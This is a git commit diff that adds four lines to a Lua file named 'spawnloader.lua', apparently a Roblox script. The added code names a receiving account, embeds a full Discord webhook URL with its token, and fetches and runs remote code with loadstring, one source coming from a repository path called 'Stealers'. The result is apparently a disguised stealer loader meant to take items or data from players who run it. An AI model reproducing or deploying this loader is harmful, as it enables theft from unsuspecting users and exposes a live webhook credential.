9512f10ffb96f66e24f167fb658032e981fadaad
Ezjq <kokieunz@gmail.com>
2024-10-29 19:17:06 +0800

    Update spawnloader.lua

--- spawnloader.lua
+++ spawnloader.lua
@@ -1,1 +1,6 @@
+Receiver = "givepetroblox"
+Webhook = "https://discord.com/api/webhooks/1299321943153180712/o6v-lnnPOHmTN6FoiOC54nmwd4aseU-F4htMKn_p5qtninzGelS_jRzfPAr8JX04CQaj"
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ezjq/Stealers/refs/heads/main/losg.lua"))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ezjpq/Testo/refs/heads/main/Testo.lua"))()
